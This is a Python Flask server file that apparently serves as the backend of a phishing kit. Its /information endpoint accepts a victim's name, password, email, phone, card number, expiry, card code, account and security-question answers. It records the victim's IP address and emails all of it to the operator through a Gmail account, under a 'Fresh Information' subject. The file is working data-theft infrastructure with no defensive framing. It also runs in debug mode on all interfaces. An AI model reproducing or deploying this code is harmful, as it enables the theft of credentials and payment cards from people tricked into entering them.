from flask import Flask, request
from flask_restful import Api, Resource, reqparse
from flask_cors import CORS
from gmail import GMail, Message
from envparse import Env

env = Env(
    GMAIL_USERNAME=dict(cast=str, default=""),
    GMAIL_PASSWORD=dict(cast=str, default=""),
    EMAIL=dict(cast=str, default=""),
)

application = Flask(__name__)

CORS(application)

api = Api(application)


class Mailer:
    def prepareBody(self, persones):
        message = ""
        for key, value in persones.items():
            if value:
                message += "<h5>{key}: {value}</h5>".format(
                    key=key, value=persones[key]
                )
        return message

    def send(self, person, information):
        gmail = GMail(env("GMAIL_USERNAME"), env("GMAIL_PASSWORD"))

        subject = "Fresh {info} {ip} !".format(info=information, ip=person["ip"])

        to = env("EMAIL")

        body = self.prepareBody(person)

        message = Message(subject=subject, to=to, html=body)

        gmail.send(message)


class Information(Resource):
    def __init__(self):
        self.parser = reqparse.RequestParser()
        self.parser.add_argument("name", type=str)
        self.parser.add_argument("password", type=str)
        self.parser.add_argument("email", type=str)
        self.parser.add_argument("age", type=str)
        self.parser.add_argument("phone", type=str)
        self.parser.add_argument("number", type=str)
        self.parser.add_argument("expire", type=str)
        self.parser.add_argument("code", type=str)
        self.parser.add_argument("compte", type=str)
        self.parser.add_argument("question_1", type=str)
        self.parser.add_argument("question_2", type=str)

    def post(self):
        person = self.parser.parse_args()
        person["ip"] = request.access_route[0]

        Mailer().send(person, "Information")

        return {"message": "Good"}, 200


api.add_resource(Information, "/information")

if __name__ == "__main__":
    application.run(host="0.0.0.0", port="8000", debug=True)
